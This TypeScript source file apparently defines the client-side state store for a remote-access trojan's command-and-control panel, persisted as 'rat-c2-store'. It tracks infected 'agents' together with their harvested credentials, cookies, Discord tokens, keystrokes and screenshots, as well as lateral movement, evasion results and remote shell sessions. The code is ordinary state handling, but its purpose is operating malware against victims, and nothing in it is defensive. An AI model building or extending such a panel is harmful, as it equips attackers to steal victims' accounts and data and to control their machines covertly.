import { create } from 'zustand'
import { persist } from 'zustand/middleware'
import type { Agent, Task, FileTransfer, Credential, Cookie, DiscordToken, Keystroke, Screenshot, ProcessInfo, LateralMove, EvasionAction, Module, Notification, ShellSession } from '@/types'

interface StoreState {
  // Agents
  agents: Agent[]
  selectedAgent: Agent | null
  setAgents: (agents: Agent[]) => void
  addAgent: (agent: Agent) => void
  updateAgent: (id: string, data: Partial<Agent>) => void
  removeAgent: (id: string) => void
  setSelectedAgent: (agent: Agent | null) => void
  fetchAgents: () => Promise<void>

  // Tasks
  tasks: Task[]
  setTasks: (tasks: Task[]) => void
  addTask: (task: Task) => void
  updateTask: (id: string, data: Partial<Task>) => void
  removeTask: (id: string) => void
  fetchTasks: (agentId: string) => Promise<void>

  // File Transfers
  fileTransfers: FileTransfer[]
  setFileTransfers: (files: FileTransfer[]) => void
  addFileTransfer: (file: FileTransfer) => void
  updateFileTransfer: (id: string, data: Partial<FileTransfer>) => void
  removeFileTransfer: (id: string) => void
  fetchFileTransfers: (agentId: string) => Promise<void>

  // Credentials
  credentials: Credential[]
  setCredentials: (creds: Credential[]) => void
  addCredential: (cred: Credential) => void
  fetchCredentials: (agentId: string) => Promise<void>

  // Cookies
  cookies: Cookie[]
  setCookies: (cookies: Cookie[]) => void
  fetchCookies: (agentId: string) => Promise<void>

  // Discord Tokens
  discordTokens: DiscordToken[]
  setDiscordTokens: (tokens: DiscordToken[]) => void
  fetchDiscordTokens: (agentId: string) => Promise<void>

  // Keystrokes
  keystrokes: Keystroke[]
  setKeystrokes: (keys: Keystroke[]) => void
  addKeystroke: (key: Keystroke) => void
  fetchKeystrokes: (agentId: string) => Promise<void>

  // Screenshots
  screenshots: Screenshot[]
  setScreenshots: (shots: Screenshot[]) => void
  addScreenshot: (shot: Screenshot) => void
  removeScreenshot: (id: string) => void
  fetchScreenshots: (agentId: string) => Promise<void>

  // Processes
  processes: ProcessInfo[]
  setProcesses: (procs: ProcessInfo[]) => void
  fetchProcesses: (agentId: string) => Promise<void>

  // Lateral Movement
  lateralMoves: LateralMove[]
  setLateralMoves: (moves: LateralMove[]) => void
  addLateralMove: (move: LateralMove) => void
  updateLateralMove: (id: string, data: Partial<LateralMove>) => void
  fetchLateralMoves: (agentId: string) => Promise<void>

  // Evasion
  evasionResults: EvasionAction[]
  setEvasionResults: (results: EvasionAction[]) => void
  addEvasionResult: (result: EvasionAction) => void
  updateEvasionResult: (id: string, data: Partial<EvasionAction>) => void
  fetchEvasionResults: (agentId: string) => Promise<void>

  // Modules
  modules: Module[]
  setModules: (modules: Module[]) => void
  fetchModules: (agentId: string) => Promise<void>

  // Shell Sessions
  shellSessions: ShellSession[]
  setShellSessions: (sessions: ShellSession[]) => void
  addShellSession: (session: ShellSession) => void
  updateShellSession: (id: string, data: Partial<ShellSession>) => void
  removeShellSession: (id: string) => void

  // Notifications
  notifications: Notification[]
  addNotification: (notification: Omit<Notification, 'id' | 'read' | 'timestamp'>) => void
  removeNotification: (id: string) => void
  clearNotifications: () => void

  // UI State
  theme: 'dark' | 'light'
  toggleTheme: () => void
  sidebarOpen: boolean
  toggleSidebar: () => void
  activeTab: string
  setActiveTab: (tab: string) => void
  filters: Record<string, any>
  setFilter: (key: string, value: any) => void
  pagination: Record<string, { page: number; pageSize: number }>
  setPagination: (key: string, page: number, pageSize: number) => void

  // Connection
  connected: boolean
  setConnected: (connected: boolean) => void
  connectionError: string | null
  setConnectionError: (error: string | null) => void
}

export const useStore = create<StoreState>()(
  persist(
    (set, get) => ({
      // Agents
      agents: [],
      selectedAgent: null,
      setAgents: (agents) => set({ agents }),
      addAgent: (agent) => set((state) => ({ agents: [...state.agents, agent] })),
      updateAgent: (id, data) => set((state) => ({ agents: state.agents.map((a) => (a.id === id ? { ...a, ...data } : a)) })),
      removeAgent: (id) => set((state) => ({ agents: state.agents.filter((a) => a.id !== id) })),
      setSelectedAgent: (agent) => set({ selectedAgent: agent }),
      fetchAgents: async () => {
        const { api } = await import('@/services/api')
        const agents = await api.getAgents()
        set({ agents })
      },

      // Tasks
      tasks: [],
      setTasks: (tasks) => set({ tasks }),
      addTask: (task) => set((state) => ({ tasks: [task, ...state.tasks] })),
      updateTask: (id, data) => set((state) => ({ tasks: state.tasks.map((t) => (t.id === id ? { ...t, ...data } : t)) })),
      removeTask: (id) => set((state) => ({ tasks: state.tasks.filter((t) => t.id !== id) })),
      fetchTasks: async (agentId) => {
        const { api } = await import('@/services/api')
        const tasks = await api.getTasks(agentId)
        set({ tasks })
      },

      // File Transfers
      fileTransfers: [],
      setFileTransfers: (files) => set({ fileTransfers: files }),
      addFileTransfer: (file) => set((state) => ({ fileTransfers: [file, ...state.fileTransfers] })),
      updateFileTransfer: (id, data) => set((state) => ({ fileTransfers: state.fileTransfers.map((f) => (f.id === id ? { ...f, ...data } : f)) })),
      removeFileTransfer: (id) => set((state) => ({ fileTransfers: state.fileTransfers.filter((f) => f.id !== id) })),
      fetchFileTransfers: async (agentId) => {
        const { api } = await import('@/services/api')
        const files = await api.getFileTransfers(agentId)
        set({ fileTransfers: files })
      },

      // Credentials
      credentials: [],
      setCredentials: (creds) => set({ credentials: creds }),
      addCredential: (cred) => set((state) => ({ credentials: [...state.credentials, cred] })),
      fetchCredentials: async (agentId) => {
        const { api } = await import('@/services/api')
        const creds = await api.getCredentials(agentId)
        set({ credentials: creds })
      },

      // Cookies
      cookies: [],
      setCookies: (cookies) => set({ cookies }),
      fetchCookies: async (agentId) => {
        const { api } = await import('@/services/api')
        const cookies = await api.getCookies(agentId)
        set({ cookies })
      },

      // Discord Tokens
      discordTokens: [],
      setDiscordTokens: (tokens) => set({ discordTokens: tokens }),
      fetchDiscordTokens: async (agentId) => {
        const { api } = await import('@/services/api')
        const tokens = await api.getDiscordTokens(agentId)
        set({ discordTokens: tokens })
      },

      // Keystrokes
      keystrokes: [],
      setKeystrokes: (keys) => set({ keystrokes: keys }),
      addKeystroke: (key) => set((state) => ({ keystrokes: [key, ...state.keystrokes] })),
      fetchKeystrokes: async (agentId) => {
        const { api } = await import('@/services/api')
        const keys = await api.getKeystrokes(agentId)
        set({ keystrokes: keys })
      },

      // Screenshots
      screenshots: [],
      setScreenshots: (shots) => set({ screenshots: shots }),
      addScreenshot: (shot) => set((state) => ({ screenshots: [shot, ...state.screenshots] })),
      removeScreenshot: (id) => set((state) => ({ screenshots: state.screenshots.filter((s) => s.id !== id) })),
      fetchScreenshots: async (agentId) => {
        const { api } = await import('@/services/api')
        const shots = await api.getScreenshots(agentId)
        set({ screenshots: shots })
      },

      // Processes
      processes: [],
      setProcesses: (procs) => set({ processes: procs }),
      fetchProcesses: async (agentId) => {
        const { api } = await import('@/services/api')
        const procs = await api.getProcesses(agentId)
        set({ processes: procs })
      },

      // Lateral Movement
      lateralMoves: [],
      setLateralMoves: (moves) => set({ lateralMoves: moves }),
      addLateralMove: (move) => set((state) => ({ lateralMoves: [move, ...state.lateralMoves] })),
      updateLateralMove: (id, data) => set((state) => ({ lateralMoves: state.lateralMoves.map((m) => (m.id === id ? { ...m, ...data } : m)) })),
      fetchLateralMoves: async (agentId) => {
        const { api } = await import('@/services/api')
        const moves = await api.getLateralMoves(agentId)
        set({ lateralMoves: moves })
      },

      // Evasion
      evasionResults: [],
      setEvasionResults: (results) => set({ evasionResults: results }),
      addEvasionResult: (result) => set((state) => ({ evasionResults: [result, ...state.evasionResults] })),
      updateEvasionResult: (id, data) => set((state) => ({ evasionResults: state.evasionResults.map((r) => (r.id === id ? { ...r, ...data } : r)) })),
      fetchEvasionResults: async (agentId) => {
        const { api } = await import('@/services/api')
        const results = await api.getEvasionResults(agentId)
        set({ evasionResults: results })
      },

      // Modules
      modules: [],
      setModules: (modules) => set({ modules }),
      fetchModules: async (agentId) => {
        const { api } = await import('@/services/api')
        const modules = await api.getModules(agentId)
        set({ modules })
      },

      // Shell Sessions
      shellSessions: [],
      setShellSessions: (sessions) => set({ shellSessions: sessions }),
      addShellSession: (session) => set((state) => ({ shellSessions: [session, ...state.shellSessions] })),
      updateShellSession: (id, data) => set((state) => ({ shellSessions: state.shellSessions.map((s) => (s.id === id ? { ...s, ...data } : s)) })),
      removeShellSession: (id) => set((state) => ({ shellSessions: state.shellSessions.filter((s) => s.id !== id) })),

      // Notifications
      notifications: [],
      addNotification: (notification) => set((state) => ({
        notifications: [{ ...notification, id: crypto.randomUUID(), read: false, timestamp: new Date().toISOString() }, ...state.notifications]
      })),
      removeNotification: (id) => set((state) => ({ notifications: state.notifications.filter((n) => n.id !== id) })),
      clearNotifications: () => set({ notifications: [] }),

      // UI State
      theme: 'dark',
      toggleTheme: () => set((state) => ({ theme: state.theme === 'dark' ? 'light' : 'dark' })),
      sidebarOpen: true,
      toggleSidebar: () => set((state) => ({ sidebarOpen: !state.sidebarOpen })),
      activeTab: '',
      setActiveTab: (tab) => set({ activeTab: tab }),
      filters: {},
      setFilter: (key, value) => set((state) => ({ filters: { ...state.filters, [key]: value } })),
      pagination: {},
      setPagination: (key, page, pageSize) => set((state) => ({ pagination: { ...state.pagination, [key]: { page, pageSize } } })),

      // Connection
      connected: false,
      setConnected: (connected) => set({ connected }),
      connectionError: null,
      setConnectionError: (error) => set({ connectionError: error }),
    }),
    {
      name: 'rat-c2-store',
      partialize: (state) => ({
        theme: state.theme,
        sidebarOpen: state.sidebarOpen,
        filters: state.filters,
        pagination: state.pagination,
      }),
    }
  )
)